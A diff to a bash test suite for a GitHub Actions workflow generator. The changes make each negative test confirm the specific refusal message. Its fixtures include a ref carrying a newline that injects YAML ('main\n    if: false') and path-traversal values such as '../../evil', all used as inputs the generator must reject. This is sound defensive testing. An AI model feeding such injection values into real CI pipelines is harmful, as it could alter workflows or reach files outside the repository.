@@ -124,9 +124,30 @@ capture_mode() {
   printf -v "$target" '%s' "$out"
 }
 
-tmproot="$(mktemp -d)"
+# Unchecked, an empty tmproot would put every scratch file, and the cleanup
+# below, at the filesystem root.
+tmproot="$(mktemp -d)" || { echo "FAIL - could not create the scratch root"; exit 1; }
 trap 'rm -rf "$tmproot"' EXIT
 : >"$tmproot/run.out"
+
+# The generator refuses an invalid invocation with exit 2 and a
+# `gen-changelog-caller.sh: <reason>` line naming the check that refused it. A
+# nonzero exit alone also covers a later check refusing the same arguments, or
+# digest resolution failing, so the reason line is what names the guard under
+# test (#1994). Stderr goes to a file, never into a captured value.
+expect_generator_refusal() {
+  # expect_generator_refusal <reason> <pass-msg> <accepted-msg> <generator-args...>
+  local reason="$1" pass_msg="$2" accepted_msg="$3" status=0 err="$tmproot/generator-refusal.err"
+  shift 3
+  bash "$gen" "$@" >/dev/null 2>"$err" || status=$?
+  if [ "$status" -eq 0 ]; then
+    fail "$accepted_msg"
+  elif [ "$status" -eq 2 ] && grep -qxF -- "gen-changelog-caller.sh: $reason" "$err"; then
+    pass "$pass_msg"
+  else
+    fail "generator refused '${*//$'\n'/\\n}' for a reason other than '$reason' (exit $status): $(head -c 400 "$err" | tr '\n' ' ')"
+  fi
+}
 # Fixtures every mode needs. Case shards skip the generator-only assertions
 # below, so nothing a case reads may be defined there (#1736).
 capture_mode workflow workflow "$sha"
@@ -137,11 +158,10 @@ capture_mode component_release release-node "$sha" --only-package-dir packages/c
 capture_mode custom_contract contract-test "$sha" --scope @acme --node-version 22.23.1 --package-dir compat --release-asset contract/schema.graphql --release-asset contract/schema.sha256
 capture_mode generated_artifacts generated-artifacts "$sha"
 capture_mode generated_artifacts_with_adr generated-artifacts-with-adr-index "$sha"
-if bash "$gen" renovate-attribution "$sha" >/dev/null 2>&1; then
-  fail "retired Renovate fragment-writer mode remains available"
-else
-  pass "retired Renovate fragment-writer mode is unavailable"
-fi
+expect_generator_refusal 'unknown mode; the usage line lists every mode' \
+  "retired Renovate fragment-writer mode is unavailable" \
+  "retired Renovate fragment-writer mode remains available" \
+  renovate-attribution "$sha"
 if [ -e "$repo_root/.github/workflows/renovate-changelog.yml" ] || [ -e "$repo_root/scripts/renovate-changelog.py" ]; then
   fail "canonical Renovate fragment-writer artifacts remain checked in"
 else
@@ -172,6 +192,63 @@ fi
 # above the gate's `if` and END directly below the `fi` that closes it.
 # BEGIN generator-only assertions
 if generator_only_assertions; then
+# A guard that reads a grep capture must reach its own fail(): under the
+# emitted suite's `set -e`/pipefail, `x="$(grep …)"` (piped or not) aborts on no
+# match before the guard runs, so the adopter sees a red check and no reason
+# (#1975). Every capture that runs grep must end in a `||` fallback.
+silent_captures="$(python3 - "$gen" <<'PY'
+import re, sys
+source = open(sys.argv[1], encoding="utf-8").read().split("\n")
+def statements():
+    """Yield (first source line, statement) with backslash and trailing-pipe
+    continuations joined, so a capture is one string but keeps its line."""
+    i = 0
+    while i < len(source):
+        start, text = i, source[i]
+        while (text.endswith("\\") or text.rstrip().endswith("|")) and i + 1 < len(source):
+            i += 1
+            text = text.rstrip().rstrip("\\") + " " + source[i].strip()
+        yield start + 1, text
+        i += 1
+def substitution(line, start):
+    """Return the body of the $( … ) opening at start, honoring quotes."""
+    depth, i, quote = 0, start, None
+    while i < len(line):
+        c = line[i]
+        if quote:
+            if c == "\\" and quote == '"':
+                i += 2
+                continue
+            if c == quote:
+                quote = None
+        elif c in "'\"":
+            quote = c
+        elif line.startswith("$(", i):
+            depth += 1
+            i += 2
+            continue
+        elif c == ")":
+            depth -= 1
+            if depth == 0:
+                return line[start + 2:i]
+        i += 1
+    return None
+def top_level(body):
+    """Drop quoted spans so a `|`/`||` inside a grep pattern is not structure."""
+    return re.sub(r"'[^']*'|\"(?:[^\"\\]|\\.)*\"", "''", body)
+for number, line in statements():
+    for match in re.finditer(r"(?:^|[\s;(])(?:local\s+)?[A-Za-z_][A-Za-z0-9_]*=\"?(\\?\$\()", line):
+        body = substitution(line, match.start(1) + (1 if line[match.start(1)] == "\\" else 0))
+        if body is None:
+            continue
+        bare = top_level(body)
+        if re.search(r"(?:^|\|)\s*grep\b", bare) and not re.search(r"\|\|[^|]*$", bare):
+            print(f"{number}: {line.strip()[:100]}")
+PY
+)"
+[ -z "$silent_captures" ] \
+  && pass "no emitted grep capture aborts the suite before its guard reports (#1975)" \
+  || fail "emitted grep captures abort silently on no match: $silent_captures"
 grep -qF 'uses: verJSON/.github/.github/workflows/generated-artifacts.yml@' <<<"$workflow" \
   && grep -qF 'raw.githubusercontent.com/verJSON/.github/' <<<"$renderer" \
   && grep -qF '* @verJSON/devs' <<<"$canonical_codeowners" \
@@ -411,24 +488,24 @@ audit_report="$(audit_checkout_credentials release-node "$tampered_reordered" 2>
 # 5. A ref that is not a bare commit is rejected, not quoted and passed through.
 # An earlier sibling generator accepted a ref and let YAML be injected through
 # it; the guard is asserted, not assumed.
+# Without the ref check, most of these still fail later, when the contract
+# digest cannot be resolved at that ref, so only the ref check's own line counts.
 for bad in 'main' "$(printf 'main\n    if: false')" '../../evil' "${sha^^}" "${sha}0" ''; do
-  if bash "$gen" workflow "$bad" >/dev/null 2>&1; then
-    fail "generator accepted a non-commit ref: '$bad'"
-  else
-    pass "generator rejects non-commit ref: '${bad//$'\n'/\\n}'"
-  fi
+  expect_generator_refusal 'ref must be a 40-character lowercase commit SHA' \
+    "generator rejects non-commit ref: '${bad//$'\n'/\\n}'" \
+    "generator accepted a non-commit ref: '$bad'" \
+    workflow "$bad"
 done
 for mode in generated-artifacts generated-artifacts-with-adr-index adr-index-generator pr-gate; do
-  if bash "$gen" "$mode" main >/dev/null 2>&1; then
-    fail "$mode accepted a mutable ref"
-  else
-    pass "$mode rejects a mutable ref"
-  fi
+  expect_generator_refusal 'ref must be a 40-character lowercase commit SHA' \
+    "$mode rejects a mutable ref" "$mode accepted a mutable ref" \
+    "$mode" main
 done
 
 # 6. An unknown mode fails rather than emitting an empty file.
-bash "$gen" bogus "$sha" >/dev/null 2>&1 \
-  && fail "generator accepted an unknown mode" || pass "generator rejects an unknown mode"
+expect_generator_refusal 'unknown mode; the usage line lists every mode' \
+  "generator rejects an unknown mode" "generator accepted an unknown mode" \
+  bogus "$sha"
 
 grep -qF "node-version: \${{ '24' }}" <<<"$default_release" \
   && grep -q "scope: '@verjson'" <<<"$default_release" \
@@ -452,14 +529,25 @@ assert_explicit_release_version release-node "$default_release"
 version_guard="$(python3 -c 'import sys, yaml; print(yaml.safe_load(sys.stdin)["jobs"]["verify"]["steps"][0]["run"])' <<<"$default_release")"
 # Bash's \u escape is locale-dependent; exercise UTF-8 bytes with the emitted step's decoder.
 # The step starts Python isolated, which ignores PYTHONUTF8, so it must request UTF-8 itself.
+# A blank version is refused with exit 1 and the step's one ::error:: line; a
+# traceback, which a decoding failure on the no-break space would raise, is
+# also exit 1, so the line is what shows the guard refused it.
+version_guard_err="$tmproot/version-guard.err"
+version_guard_misses=''
+for blank_version in '' '  ' $'\xc2\xa0'; do
+  version_guard_status=0
+  env -u PYTHONUTF8 LC_ALL=C INPUT_VERSION="$blank_version" bash -c "$version_guard" \
+    >/dev/null 2>"$version_guard_err" || version_guard_status=$?
+  [ "$version_guard_status" -eq 1 ] \
+    && [ "$(cat "$version_guard_err")" = '::error::version is required for release dispatch' ] \
+    || version_guard_misses="$version_guard_misses $(printf '%q' "$blank_version") exited $version_guard_status: $(head -c 200 "$version_guard_err" | tr '\n' ' ');"
+done
 [ -n "$version_guard" ] \
   && grep -qF "python3 -I -X utf8 - <<'PY'" <<<"$version_guard" \
-  && ! env -u PYTHONUTF8 LC_ALL=C INPUT_VERSION='' bash -c "$version_guard" >/dev/null 2>&1 \
-  && ! env -u PYTHONUTF8 LC_ALL=C INPUT_VERSION='  ' bash -c "$version_guard" >/dev/null 2>&1 \
-  && ! env -u PYTHONUTF8 LC_ALL=C INPUT_VERSION=$'\xc2\xa0' bash -c "$version_guard" >/dev/null 2>&1 \
+  && [ -z "$version_guard_misses" ] \
   && env -u PYTHONUTF8 LC_ALL=C INPUT_VERSION='v1.2.3' bash -c "$version_guard" >/dev/null 2>&1 \
   && pass "release dispatch rejects blank versions before resolving a plan" \
-  || fail "release dispatch version guard accepts blank input or rejects an explicit version"
+  || fail "release dispatch version guard accepts blank input or rejects an explicit version${version_guard_misses:+:$version_guard_misses}"
 component_trigger="$(sed -n '/^on:$/,/^permissions:$/p' <<<"$component_release" | sed '$d')"
 expected_component_trigger="$(cat <<'YAML'
 on:
@@ -518,11 +606,10 @@ for component_mode in release-snapshot release-artifact; do
     && pass "$component_mode emits the same byte-exact component workflow defaults (#1565)" \
     || fail "$component_mode component workflow defaults differ from release-node"
 done
-if bash "$gen" contract-test "$sha" --default-prefix schema-v --default-component cli-schema >/dev/null 2>&1; then
-  fail "contract-test accepted release-caller-only default options"
-else
-  pass "non-release modes reject release-caller default options (#1565)"
-fi
+expect_generator_refusal 'release defaults are accepted only by release-node, release-artifact and release-snapshot' \
+  "non-release modes reject release-caller default options (#1565)" \
+  "contract-test accepted release-caller-only default options" \
+  contract-test "$sha" --default-prefix schema-v --default-component cli-schema
 grep -qF '# The verification suite runs after package.json has been stamped to the' <<<"$default_release" \
   && grep -qF '# dispatched version. Its expected version must be read dynamically from' <<<"$default_release" \
   && grep -qF '# package.json; never assert a hardcoded version literal.' <<<"$default_release" \
@@ -579,57 +666,60 @@ grep -q 'EXPECTED_RELEASE_NODE_VERSION="22.23.1"' <<<"$custom_contract" \
   && pass "contract-test preserves generator parameters and checks caller-specific directories" \
   || fail "contract-test does not bind the selected release parameters"
 
-for bad_args in \
-  "--scope Acme" \
-  "--scope @Acme" \
-  "--scope @acme/other" \
-  "--scope @acme --scope @other" \
-  "--node-version lts/*" \
-  "--node-version 022" \
-  "--node-version 22.0.0.1" \
-  "--node-version 24 --node-version 22" \
-  "--default-prefix schema-v" \
-  "--default-component cli-schema" \
-  "--default-prefix v --default-component cli-schema" \
-  "--default-prefix Schema-v --default-component cli-schema" \
-  "--default-prefix schema --default-component cli-schema" \
-  "--default-prefix schema-v --default-component CLI-schema" \
-  "--default-prefix schema-v --default-component -cli-schema" \
-  "--default-prefix schema-v --default-component aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa" \
-  "--default-prefix schema-v --default-prefix other-v --default-component cli-schema" \
-  "--default-prefix schema-v --default-component cli-schema --default-component other" \
-  "--package-dir ../compat" \
-  "--package-dir /tmp/compat" \
-  "--package-dir -compat" \
-  "--package-dir ~compat" \
-  "--package-dir compat --package-dir compat" \
-  "--package-dir ."; do
-  # Intentional word splitting: each fixture is a complete argument sequence.
-  # shellcheck disable=SC2086
-  if bash "$gen" release-node "$sha" $bad_args >/dev/null 2>&1; then
-    fail "release-node accepted invalid or duplicate parameters: $bad_args"
-  else
-    pass "release-node rejects invalid or duplicate parameters: $bad_args"
-  fi
-done
-for bad_assets in \
-  "--release-asset ../schema.graphql" \
-  "--release-asset /tmp/schema.graphql" \
-  "--release-asset contract/./schema.graphql" \
-  "--release-asset contract/schema.graphql --release-asset contract/schema.graphql" \
-  "--release-asset a/schema.graphql --release-asset b/schema.graphql"; do
-  # Intentional word splitting: fixtures contain no whitespace-bearing paths.
-  # shellcheck disable=SC2086
-  bash "$gen" release-node "$sha" $bad_assets >/dev/null 2>&1 \
-    && fail "release-node accepted invalid release assets: $bad_assets" \
-    || pass "release-node rejects invalid release assets: $bad_assets"
-done
-bash "$gen" workflow "$sha" --release-asset contract/schema.graphql >/dev/null 2>&1 \
-  && fail "workflow mode accepted release assets" \
-  || pass "non-release-node modes reject release assets"
-bash "$gen" workflow "$sha" --scope @acme >/dev/null 2>&1 \
-  && fail "workflow mode accepted release-only parameters" \
-  || pass "non-release generator modes reject release-only parameters"
+# Each case names the check that must refuse it: several share an option, and a
+# case whose own check is gone is often still refused by a neighbor.
+# `read -a` splits each sequence into arguments without glob expansion.
+while IFS='|' read -r bad_args bad_args_reason; do
+  read -r -a bad_argv <<<"$bad_args"
+  expect_generator_refusal "$bad_args_reason" \
+    "release-node rejects invalid or duplicate parameters: $bad_args" \
+    "release-node accepted invalid or duplicate parameters: $bad_args" \
+    release-node "$sha" "${bad_argv[@]}"
+done <<'BAD_ARGS'
+--scope Acme|scope must be a lowercase npm scope such as @verjson
+--scope @Acme|scope must be a lowercase npm scope such as @verjson
+--scope @acme/other|scope must be a lowercase npm scope such as @verjson
+--scope @acme --scope @other|--scope was repeated
+--node-version lts/*|node version must be a numeric major, major.minor, or major.minor.patch
+--node-version 022|node version must be a numeric major, major.minor, or major.minor.patch
+--node-version 22.0.0.1|node version must be a numeric major, major.minor, or major.minor.patch
+--node-version 24 --node-version 22|--node-version was repeated
+--default-prefix schema-v|--default-prefix and --default-component must be provided together
+--default-component cli-schema|--default-prefix and --default-component must be provided together
+--default-prefix v --default-component cli-schema|--default-prefix must be a lowercase stream name followed by -v
+--default-prefix Schema-v --default-component cli-schema|--default-prefix must be a lowercase stream name followed by -v
+--default-prefix schema --default-component cli-schema|--default-prefix must be a lowercase stream name followed by -v
+--default-prefix schema-v --default-component CLI-schema|--default-component must be a 1-64 character lowercase component identifier
+--default-prefix schema-v --default-component -cli-schema|--default-component must be a 1-64 character lowercase component identifier
+--default-prefix schema-v --default-component aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa|--default-component must be a 1-64 character lowercase component identifier
+--default-prefix schema-v --default-prefix other-v --default-component cli-schema|--default-prefix was repeated
+--default-prefix schema-v --default-component cli-schema --default-component other|--default-component was repeated
+--package-dir ../compat|package dir may not contain . or .. segments
+--package-dir /tmp/compat|package dir must be a normalized repository-relative path
+--package-dir -compat|package dir must be a normalized repository-relative path
+--package-dir ~compat|package dir must be a normalized repository-relative path
+--package-dir compat --package-dir compat|duplicate package dir: compat
+--package-dir .|duplicate package dir: .
+BAD_ARGS
+while IFS='|' read -r bad_assets bad_assets_reason; do
+  read -r -a bad_assets_argv <<<"$bad_assets"
+  expect_generator_refusal "$bad_assets_reason" \
+    "release-node rejects invalid release assets: $bad_assets" \
+    "release-node accepted invalid release assets: $bad_assets" \
+    release-node "$sha" "${bad_assets_argv[@]}"
+done <<'BAD_ASSETS'
+--release-asset ../schema.graphql|--release-asset must be a normalized repository-relative path
+--release-asset /tmp/schema.graphql|--release-asset must be a normalized repository-relative path
+--release-asset contract/./schema.graphql|--release-asset must be a normalized repository-relative path
+--release-asset contract/schema.graphql --release-asset contract/schema.graphql|release asset paths must be unique
+--release-asset a/schema.graphql --release-asset b/schema.graphql|release asset basenames must be unique
+BAD_ASSETS
+expect_generator_refusal '--release-asset is accepted only by release-node and contract-test' \
+  "non-release-node modes reject release assets" "workflow mode accepted release assets" \
+  workflow "$sha" --release-asset contract/schema.graphql
+expect_generator_refusal 'release parameters are accepted only by release-node, release-artifact, release-snapshot and contract-test' \
+  "non-release generator modes reject release-only parameters" "workflow mode accepted release-only parameters" \
+  workflow "$sha" --scope @acme
 
 # 7. The emitted renderer fails closed when the contract cannot be fetched, and
 # leaves no partial file behind for the next run to exec as if it were the
@@ -723,10 +813,21 @@ else
 fi
 # A suite that cannot fail is the defect #1380 reports, so prove this one still
 # detects a broken generator rather than only that it exits 0.
+# The suite exits 1 once any case failed, so the two calendar cases the mutant
+# breaks are what show it was detected, not a fixture the suite could not run.
 sed -i 's/^  \[ "\$day" -le "\$max_day" \]$/  return 0/' "$adr_suite_adopter/scripts/gen-adr-index.sh"
+adr_mutant_status=0
 bash "$adr_suite_adopter/scripts/gen-adr-index.test.sh" >"$tmproot/adr-adopter-mutant.log" 2>&1 \
-  && fail "the generated suite passed against a generator that accepts impossible dates" \
-  || pass "the generated suite detects a broken generator instead of passing vacuously"
+  || adr_mutant_status=$?
+if [ "$adr_mutant_status" -eq 0 ]; then
+  fail "the generated suite passed against a generator that accepts impossible dates"
+elif [ "$adr_mutant_status" -eq 1 ] \
+  && grep -qxF 'FAIL - impossible calendar date must fail (#78)' "$tmproot/adr-adopter-mutant.log" \
+  && grep -qxF 'FAIL - non-leap February 29 must fail (#78)' "$tmproot/adr-adopter-mutant.log"; then
+  pass "the generated suite detects a broken generator instead of passing vacuously"
+else
+  fail "the generated suite failed against the impossible-date generator for another reason (exit $adr_mutant_status): $(grep -m3 '^FAIL' "$tmproot/adr-adopter-mutant.log" | tr '\n' ' ')"
+fi
 
 # The suite is a member of the generated set, so the contract test pins its
 # digest exactly as it pins the generator's — a partial regeneration fails there.
@@ -1096,11 +1197,10 @@ bash -n "$emitted" 2>/dev/null \
   || fail "emitted contract test does not parse"
 
 for bad in 'main' "$(printf 'main\n  if: false')" '../../evil' "${sha^^}" "${sha}0" ''; do
-  if bash "$gen" contract-test "$bad" >/dev/null 2>&1; then
-    fail "contract-test mode accepted a non-commit ref: '$bad'"
-  else
-    pass "contract-test mode rejects a non-commit ref: '${bad//$'\n'/\\n}'"
-  fi
+  expect_generator_refusal 'ref must be a 40-character lowercase commit SHA' \
+    "contract-test mode rejects a non-commit ref: '${bad//$'\n'/\\n}'" \
+    "contract-test mode accepted a non-commit ref: '$bad'" \
+    contract-test "$bad"
 done
 
 grep -q "CONTRACT_REF=\"$sha\"" "$emitted" \
@@ -1212,14 +1312,26 @@ open(target, "w", encoding="utf-8").write(text.replace(header, header + line + "
 PY
   printf '%s\n' "$copy"
 }
+# A copy that cannot run, or cannot resolve the contract digest, also exits
+# nonzero with no output. The injected function's own stderr sentinel is what
+# shows it ran and stopped the mode; the exit status itself is not contractual.
+injected_err="$tmproot/injected-generator.err"
 while IFS='|' read -r injected_function injected_mode injected_args; do
-  injected_gen="$(inject_generator "fail-$injected_function-$injected_mode" "$injected_function" '  return 3')"
+  injected_gen="$(inject_generator "fail-$injected_function-$injected_mode" "$injected_function" \
+    "  echo \"injected-failure:$injected_function\" >&2; return 3")"
+  injected_status=0
   # shellcheck disable=SC2086 # the extra generator arguments are word-split on purpose
-  injected_out="$(GIT_DIR="$injected_generator_git_dir" bash "$injected_gen" "$injected_mode" "$sha" $injected_args 2>/dev/null)" \
-    && fail "the generator exited 0 when $injected_function failed inside $injected_mode" \
-    || { [ -z "$injected_out" ] \
-      && pass "a failing $injected_function stops $injected_mode with no output" \
-      || fail "a failing $injected_function stopped $injected_mode only after emitting output"; }
+  injected_out="$(GIT_DIR="$injected_generator_git_dir" bash "$injected_gen" "$injected_mode" "$sha" $injected_args 2>"$injected_err")" \
+    || injected_status=$?
+  if [ "$injected_status" -eq 0 ]; then
+    fail "the generator exited 0 when $injected_function failed inside $injected_mode"
+  elif ! grep -qxF -- "injected-failure:$injected_function" "$injected_err"; then
+    fail "$injected_mode exited $injected_status without the injected sentinel, so $injected_function never ran: $(head -c 300 "$injected_err" | tr '\n' ' ')"
+  elif [ -n "$injected_out" ]; then
+    fail "a failing $injected_function stopped $injected_mode only after emitting output"
+  else
+    pass "a failing $injected_function stops $injected_mode with no output"
+  fi
 done <<'INJECTIONS'
 release_snapshot_with|release-node|
 release_snapshot_job|release-snapshot|
@@ -1525,6 +1637,32 @@ schedule_adopter_script() {
   adopter_job_pids+=("$last_rejection_pid")
   adopter_job_results+=("$result")
   pump_adopter_jobs
+}
+
+# For a scheduled script: the emitted suite stops at its first failure with
+# exit 1 and a FAIL line naming it. Any other failure is nonzero too, so the
+# reason is what shows the invariant under test refused the adopter (#1994).
+# Only the failure report counts, from the first FAIL line to the end: the
+# `ok -` lines before it can carry a reason's text, and two reasons sit on the
+# indented lines that continue a FAIL. One awk reads the whole log, so no pipe
+# feeds an early-exiting consumer (#1430/#1445).
+# Reads the job's own $status and $ADOPTER_LOG.
+failure_report_names() { # failure_report_names <reason> <log>
+  REASON="$1" awk '
+    /^FAIL - / { reporting = 1 }
+    reporting && index($0, ENVIRON["REASON"]) { found = 1 }
+    END { exit !found }
+  ' "$2"
+}
+expect_scheduled_rejection() {
+  # expect_scheduled_rejection <reason> <pass-msg> <accepted-msg>
+  if [ "$status" -eq 0 ]; then
+    fail "$3"
+  elif [ "$status" -eq 1 ] && failure_report_names "$1" "$ADOPTER_LOG"; then
+    pass "$2"
+  else
+    fail "rejected for a reason other than '$1' (exit $status), so unproven: $2: $(tail -2 "$ADOPTER_LOG")"
+  fi
 }
 
 adopter="$tmproot/adopter"
@@ -1931,8 +2069,10 @@ sed -i "s/release-propose.yml@$sha/release-propose.yml@0000000000000000000000000
 schedule_adopter_script "$stale_proposer" "$(cat <<'SCHED_SCRIPT'
 if [ "$status" -eq 0 ]; then
   fail "emitted suite accepted a release proposer on another pin"
-else
+elif grep -qF 'does not call release-propose.yml at the shared pin' "$ADOPTER_LOG"; then
   pass "emitted suite rejects a release proposer on another pin"
+else
+  fail "release proposer on another pin was rejected for the wrong reason: $(tail -2 "$ADOPTER_LOG")"
 fi
 SCHED_SCRIPT
 )"
@@ -1944,8 +2084,10 @@ sed -i '/^      issues: write$/a\      actions: write' \
 schedule_adopter_script "$overprivileged_proposer" "$(cat <<'SCHED_SCRIPT'
 if [ "$status" -eq 0 ]; then
   fail "emitted suite accepted both issue and dispatch authority in propose mode"
-else
+elif grep -qF 'propose mode must grant issues-write and not actions-write' "$ADOPTER_LOG"; then
   pass "emitted suite rejects mixed release-proposer write authority"
+else
+  fail "mixed release-proposer write authority was rejected for the wrong reason: $(tail -2 "$ADOPTER_LOG")"
 fi
 SCHED_SCRIPT
 )"
@@ -1957,18 +2099,25 @@ sed -i '/^      contract_ref:/a\      autonomy: ${{ inputs.autonomy }}' \
 schedule_adopter_script "$event_selected_proposer" "$(cat <<'SCHED_SCRIPT'
 if [ "$status" -eq 0 ]; then
   fail "emitted suite accepted event-selected release autonomy"
-else
+elif grep -qF 'must select autonomy through its reusable workflow path' "$ADOPTER_LOG"; then
   pass "emitted suite rejects event-selected release autonomy"
+else
+  fail "event-selected release autonomy was rejected for the wrong reason: $(tail -2 "$ADOPTER_LOG")"
 fi
 SCHED_SCRIPT
 )"
 
+# Regenerations below build the case fixtures, not case assertions: a
+# generator failure must abort every shard, never be suspended with the case
+# that precedes it, or an empty release.yml would read as a valid rejection.
 nested_adopter="$tmproot/adopter-nested-only-release"
 build_adopter "$nested_adopter"
 bash "$gen" release-node "$sha" --only-package-dir packages/cli-schema \
   --default-prefix schema-v --default-component cli-schema \
-  >"$nested_adopter/.github/workflows/release.yml"
-bash "$gen" contract-test "$sha" --only-package-dir packages/cli-schema >"$nested_adopter/scripts/changelog-contract.test.sh"
+  >"$nested_adopter/.github/workflows/release.yml" \
+  || { echo "FAIL - could not regenerate the nested-only release caller"; exit 1; }
+bash "$gen" contract-test "$sha" --only-package-dir packages/cli-schema >"$nested_adopter/scripts/changelog-contract.test.sh" \
+  || { echo "FAIL - could not generate the nested-only contract test"; exit 1; }
 schedule_adopter_script "$nested_adopter" "$(cat <<'SCHED_SCRIPT'
 if [ "$status" -eq 0 ]; then
   pass "nested-only release and contract agree on component defaults without selecting root (#1286, #1565)"
@@ -1982,45 +2131,56 @@ sed -i "s/default: 'schema-v'/default: v/" \
 schedule_adopter_script "$nested_adopter" "$(cat <<'SCHED_SCRIPT'
 if [ "$status" -eq 0 ]; then
   fail "component release contract accepted a mutated default prefix"
-else
+elif grep -qF 'workflow_dispatch input schema differs from the generated contract' "$ADOPTER_LOG"; then
   pass "component release contract rejects default-prefix byte drift (#1565)"
+else
+  fail "default-prefix byte drift was rejected for the wrong reason: $(tail -2 "$ADOPTER_LOG")"
 fi
 SCHED_SCRIPT
 )"
 bash "$gen" release-node "$sha" --only-package-dir packages/cli-schema \
   --default-prefix schema-v --default-component cli-schema \
-  >"$nested_adopter/.github/workflows/release.yml"
+  >"$nested_adopter/.github/workflows/release.yml" \
+  || { echo "FAIL - could not regenerate the nested-only release caller"; exit 1; }
 sed -i "s/default: 'cli-schema'/default: ''/" \
   "$nested_adopter/.github/workflows/release.yml"
 schedule_adopter_script "$nested_adopter" "$(cat <<'SCHED_SCRIPT'
 if [ "$status" -eq 0 ]; then
   fail "component release contract accepted a mutated default component"
-else
+elif grep -qF 'workflow_dispatch input schema differs from the generated contract' "$ADOPTER_LOG"; then
   pass "component release contract rejects default-component byte drift (#1565)"
+else
+  fail "default-component byte drift was rejected for the wrong reason: $(tail -2 "$ADOPTER_LOG")"
 fi
 SCHED_SCRIPT
 )"
 bash "$gen" release-node "$sha" --only-package-dir packages/cli-schema \
   --default-prefix schema-v --default-component cli-schema \
-  >"$nested_adopter/.github/workflows/release.yml"
+  >"$nested_adopter/.github/workflows/release.yml" \
+  || { echo "FAIL - could not regenerate the nested-only release caller"; exit 1; }
 sed -i 's/package_dirs=(packages\/cli-schema)/package_dirs=(. packages\/cli-schema)/' "$nested_adopter/.github/workflows/release.yml"
 schedule_adopter_script "$nested_adopter" "$(cat <<'SCHED_SCRIPT'
 if [ "$status" -eq 0 ]; then
   fail "nested-only contract accepted an extra root verification stamp"
-else
+elif grep -qF 'does not stamp every package directory selected for publication' "$ADOPTER_LOG"; then
   pass "nested-only contract rejects extra root verification stamp (#1286)"
+else
+  fail "extra root verification stamp was rejected for the wrong reason: $(tail -2 "$ADOPTER_LOG")"
 fi
 SCHED_SCRIPT
 )"
 bash "$gen" release-node "$sha" --only-package-dir packages/cli-schema \
   --default-prefix schema-v --default-component cli-schema \
-  >"$nested_adopter/.github/workflows/release.yml"
+  >"$nested_adopter/.github/workflows/release.yml" \
+  || { echo "FAIL - could not regenerate the nested-only release caller"; exit 1; }
 sed -i 's/\["packages\/cli-schema"\]/[".","packages\/cli-schema"]/' "$nested_adopter/.github/workflows/release.yml"
 schedule_adopter_script "$nested_adopter" "$(cat <<'SCHED_SCRIPT'
 if [ "$status" -eq 0 ]; then
   fail "nested-only contract accepted root publication"
-else
+elif grep -qF 'does not pass '\''package-dirs: ' "$ADOPTER_LOG"; then
   pass "nested-only contract rejects extra root publication (#1286)"
+else
+  fail "extra root publication was rejected for the wrong reason: $(tail -2 "$ADOPTER_LOG")"
 fi
 SCHED_SCRIPT
 )"
@@ -2099,11 +2259,9 @@ printf '%s\n' "$custom_release" >"$custom_adopter/.github/workflows/release.yml"
 sed -i "s/scope: '@acme'/scope: '@other'/" \
   "$custom_adopter/.github/workflows/release.yml"
 schedule_adopter_script "$custom_adopter" "$(cat <<'SCHED_SCRIPT'
-if [ "$status" -eq 0 ]; then
-  fail "custom contract accepted a release scope that drifted after generation"
-else
-  pass "custom contract rejects release parameter drift (#520)"
-fi
+expect_scheduled_rejection 'release.yml does not use npm scope @acme consistently; regenerate release-node and contract-test with the same --scope (#520)' \
+  "custom contract rejects release parameter drift (#520)" \
+  "custom contract accepted a release scope that drifted after generation"
 SCHED_SCRIPT
 )"
 
@@ -2115,11 +2273,9 @@ chmod +x "$omitted_stamp_adopter/scripts/changelog-contract.test.sh"
 sed -i 's/package_dirs=(. compat)/package_dirs=(.)/' \
   "$omitted_stamp_adopter/.github/workflows/release.yml"
 schedule_adopter_script "$omitted_stamp_adopter" "$(cat <<'SCHED_SCRIPT'
-if [ "$status" -eq 0 ]; then
-  fail "custom contract accepted a verification stamp that omitted a published package"
-else
-  pass "custom contract rejects a verification stamp that omits a published package (#557)"
-fi
+expect_scheduled_rejection 'release.yml does not stamp every package directory selected for publication (#557)' \
+  "custom contract rejects a verification stamp that omits a published package (#557)" \
+  "custom contract accepted a verification stamp that omitted a published package"
 SCHED_SCRIPT
 )"
 
@@ -2141,11 +2297,9 @@ sed -i \
   -e '/^      changelog: true$/d' \
   "$retired_adopter/.github/workflows/changelog.yml"
 schedule_adopter_script "$retired_adopter" "$(cat <<'SCHED_SCRIPT'
-if [ "$status" -eq 0 ]; then
-  fail "emitted suite accepts the retired changelog-validate workflow"
-else
-  pass "emitted suite requires the generated workflow behind the required context (#835)"
-fi
+expect_scheduled_rejection 'changelog.yml does not call generated-artifacts.yml at the shared pin' \
+  "emitted suite requires the generated workflow behind the required context (#835)" \
+  "emitted suite accepts the retired changelog-validate workflow"
 SCHED_SCRIPT
 )"
 
@@ -2160,11 +2314,9 @@ cat >>"$cross_job_adopter/.github/workflows/changelog.yml" <<'YAML'
       - run: 'true'
 YAML
 schedule_adopter_script "$cross_job_adopter" "$(cat <<'SCHED_SCRIPT'
-if [ "$status" -eq 0 ]; then
-  fail "emitted suite accepts canonical fields spread across different jobs"
-else
-  pass "emitted suite binds the canonical caller fields to the changelog job (#835)"
-fi
+expect_scheduled_rejection 'changelog.yml changelog inputs must be nested under exactly one canonical with mapping' \
+  "emitted suite binds the canonical caller fields to the changelog job (#835)" \
+  "emitted suite accepts canonical fields spread across different jobs"
 SCHED_SCRIPT
 )"
 
@@ -2173,11 +2325,9 @@ cp -a "$generated_adopter" "$named_job_adopter"
 sed -i '/^  changelog:$/a\    name: renamed required check' \
   "$named_job_adopter/.github/workflows/changelog.yml"
 schedule_adopter_script "$named_job_adopter" "$(cat <<'SCHED_SCRIPT'
-if [ "$status" -eq 0 ]; then
-  fail "emitted suite accepts a changelog job with a check-name override"
-else
-  pass "emitted suite rejects a job-level name that changes the required context (#835)"
-fi
+expect_scheduled_rejection 'changelog.yml changelog job may contain only the canonical uses and with fields; name, strategy, matrix, and other check-shaping fields are forbidden' \
+  "emitted suite rejects a job-level name that changes the required context (#835)" \
+  "emitted suite accepts a changelog job with a check-name override"
 SCHED_SCRIPT
 )"
 
@@ -2186,11 +2336,9 @@ cp -a "$generated_adopter" "$matrix_job_adopter"
 sed -i '/^  changelog:$/a\    strategy:\n      matrix:\n        shard: [one, two]' \
   "$matrix_job_adopter/.github/workflows/changelog.yml"
 schedule_adopter_script "$matrix_job_adopter" "$(cat <<'SCHED_SCRIPT'
